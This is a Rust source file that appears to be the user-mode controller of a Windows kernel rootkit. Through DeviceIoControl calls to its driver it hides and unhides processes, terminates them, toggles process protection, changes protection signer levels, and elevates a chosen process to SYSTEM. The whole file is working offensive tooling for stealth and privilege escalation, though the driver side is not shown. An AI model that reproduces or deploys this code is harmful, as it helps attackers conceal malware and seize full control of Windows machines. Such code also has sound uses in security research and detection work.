use {
    log::{error, info, debug},
    std::{
        ffi::c_void, 
        mem::size_of, 
        ptr::null_mut
    },
    common::{
        vars::MAX_PID,
        structs::TargetProcess,
    },
    crate::{
        utils::{open_driver, Options}, 
        PS_PROTECTED_SIGNER, PS_PROTECTED_TYPE,
    },
    windows_sys::Win32::{
        System::IO::DeviceIoControl,
        Foundation::{CloseHandle, GetLastError, HANDLE},
    },
};

/// Provides operations for managing processes through a driver interface.
pub struct Process {
    driver_handle: HANDLE,
}

impl Process {
    /// Creates a new `Process` instance, opening a handle to the driver.
    ///
    /// # Returns
    /// 
    /// * An instance of `Process`.
    /// 
    /// # Panics
    /// 
    /// Panics if the driver cannot be opened.
    pub fn new() -> Self {
        let driver_handle = open_driver().expect("Error");
        Process { driver_handle }
    }

    /// Hides or unhides a Process specified by `pid`.
    ///
    /// # Arguments
    ///
    /// * `pid` - An optional reference to the PID (Process ID) of the Process to hide/unhide.
    /// * `ioctl_code` - The IOCTL code for the hide/unhide operation.
    /// * `enable` - A boolean indicating whether to hide (`true`) or unhide (`false`) the Process.
    pub fn hide_unhide_process(&mut self, pid: Option<&u32>, ioctl_code: u32, enable: bool) {
        if let Some(pid_value) = pid {
            info!("Preparing to {} process: {}", if enable { "hide" } else { "unhide" }, pid_value);
            let pid = *pid_value as usize;
            let mut target_process = TargetProcess { enable, pid, ..Default::default() };
            let mut return_buffer = 0;

            let status = unsafe {
                DeviceIoControl(
                    self.driver_handle,
                    ioctl_code,
                    &mut target_process as *mut _ as *mut c_void,
                    size_of::<TargetProcess>() as u32,
                    null_mut(),
                    0,
                    &mut return_buffer,
                    null_mut(),
                )
            };

            if status == 0 {
                error!("DeviceIoControl Failed with status: 0x{:08X}", unsafe { GetLastError() });
            } else {
                info!("Process with PID {} successfully {}hidden", pid, if enable { "" } else { "un" });
            }
        } else {
            error!("PID not supplied");
        }
    }

    /// Terminates a specified process by `pid`.
    ///
    /// # Arguments
    ///
    /// * `pid` - An optional reference to the PID of the process to terminate.
    /// * `ioctl_code` - The IOCTL code for the terminate operation.
    pub fn terminate_process(&mut self, pid: Option<&u32>, ioctl_code: u32) {
        if let Some(pid_value) = pid {
            info!("Preparing to terminate process: {}", pid_value);
            let pid = *pid_value as usize;
            let mut target_process = TargetProcess { pid, ..Default::default() };
            let mut return_buffer = 0;

            let status = unsafe {
                DeviceIoControl(
                    self.driver_handle,
                    ioctl_code,
                    &mut target_process as *mut _ as *mut c_void,
                    size_of::<TargetProcess>() as u32,
                    null_mut(),
                    0,
                    &mut return_buffer,
                    null_mut(),
                )
            };

            if status == 0 {
                error!("DeviceIoControl Failed with status: 0x{:08X}", unsafe { GetLastError() });
            } else {
                info!("Process with PID {} terminated successfully", pid);
            }
        } else {
            error!("PID not supplied");
        }
    }

    /// Enables or disables protection for a process specified by `pid`.
    ///
    /// # Arguments
    ///
    /// * `pid` - An optional reference to the PID of the process.
    /// * `ioctl_code` - The IOCTL code for the protection operation.
    /// * `enable` - `true` to enable or `false` to disable protection.
    #[cfg(not(feature = "mapper"))]
    pub fn protection_process(&mut self, pid: Option<&u32>, ioctl_code: u32, enable: bool) {
        if let Some(pid_value) = pid {
            info!("Preparing to {} protection for process: {}", if enable { "enable" } else { "disable" }, pid_value);
            let pid = *pid_value as usize;
            let mut target_process = TargetProcess { pid, enable, ..Default::default() };
            let mut return_buffer = 0;

            let status = unsafe {
                DeviceIoControl(
                    self.driver_handle,
                    ioctl_code,
                    &mut target_process as *mut _ as *mut c_void,
                    size_of::<TargetProcess>() as u32,
                    null_mut(),
                    0,
                    &mut return_buffer,
                    null_mut(),
                )
            };

            if status == 0 {
                error!("DeviceIoControl Failed with status: 0x{:08X}", unsafe { GetLastError() });
            } else {
                info!("Process with PID {} {} protection", pid, if enable { "enabled" } else { "disabled" });
            }
        } else {
            error!("PID not supplied");
        }
    }

    /// Enumerates all processes and retrieves information about them.
    ///
    /// # Arguments
    ///
    /// * `ioctl_code` - The IOCTL code for the enumeration operation.
    /// * `option` - Reference to `Options` struct specifying options for the enumeration.
    pub fn enumerate_process(&mut self, ioctl_code: u32, option: &Options) {
        let mut info_process: [TargetProcess; MAX_PID] = unsafe { std::mem::zeroed() };
        let mut enumeration_input = TargetProcess {
            options: option.to_shared(),
            ..Default::default()
        };

        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                &mut enumeration_input as *mut _ as *mut c_void,
                size_of::<TargetProcess>() as u32,
                info_process.as_mut_ptr() as *mut _,
                (info_process.len() * size_of::<TargetProcess>()) as u32,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            error!("DeviceIoControl Failed with status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            let total_process = return_buffer as usize / size_of::<TargetProcess>();
            info!("Total Processes: {}", total_process);
            println!("Listing Processes:");
            for (i, process) in info_process.iter().enumerate().take(total_process) {
                if process.pid > 0 {
                    println!("[{}] {}", i, process.pid);
                }
            }
        }
    }

    /// Applies signature protection to a process specified by `pid`.
    ///
    /// # Arguments
    ///
    /// * `pid` - An optional reference to the PID of the process.
    /// * `ioctl_code` - The IOCTL code for the protection operation.
    /// * `sg` - The signature level.
    /// * `tp` - The protection type.
    pub fn signature_process(&mut self, pid: Option<&u32>, ioctl_code: u32, sg: &PS_PROTECTED_SIGNER, tp: &PS_PROTECTED_TYPE) {
        if let Some(pid_value) = pid {
            info!("Preparing to apply signature protection for process: {}", pid_value);
            let pid = *pid_value as usize;
            let sg = *sg as usize;
            let tp = *tp as usize;
            let mut info_protection_process = TargetProcess { pid, sg, tp, ..Default::default() };
            let mut return_buffer = 0;

            let status = unsafe {
                DeviceIoControl(
                    self.driver_handle,
                    ioctl_code,
                    &mut info_protection_process as *mut _ as *mut c_void,
                    size_of::<TargetProcess>() as u32,
                    null_mut(),
                    0,
                    &mut return_buffer,
                    null_mut(),
                )
            };

            if status == 0 {
                error!("DeviceIoControl Failed with status: 0x{:08X}", unsafe { GetLastError() });
            } else {
                info!("Process with PID {} successfully protected", pid);
            }
        }
    }

    /// Elevates the privileges of a specified process to System level.
    ///
    /// # Arguments
    ///
    /// * `pid` - An optional reference to the PID of the process to elevate.
    /// * `ioctl_code` - The IOCTL code for the elevation operation.
    pub fn elevate_process(&mut self, pid: Option<&u32>, ioctl_code: u32) {
        if let Some(pid_value) = pid {
            info!("Preparing to elevate process: {}", pid_value);
            let pid = *pid_value as usize;
            let mut target_process = TargetProcess { pid, ..Default::default() };
            let mut return_buffer = 0;

            let status = unsafe {
                DeviceIoControl(
                    self.driver_handle,
                    ioctl_code,
                    &mut target_process as *mut _ as *mut c_void,
                    size_of::<TargetProcess>() as u32,
                    null_mut(),
                    0,
                    &mut return_buffer,
                    null_mut(),
                )
            };

            if status == 0 {
                error!("DeviceIoControl Failed with status: 0x{:08X}", unsafe { GetLastError() });
            } else {
                info!("Process with PID {} elevated to System", pid);
            }
        } else {
            error!("PID not supplied");
        }
    }
}

impl Drop for Process {
    /// Ensures the driver handle is closed when `Thread` goes out of scope.
    fn drop(&mut self) {
        debug!("Closing the driver handle");
        unsafe { CloseHandle(self.driver_handle) };
    }
}
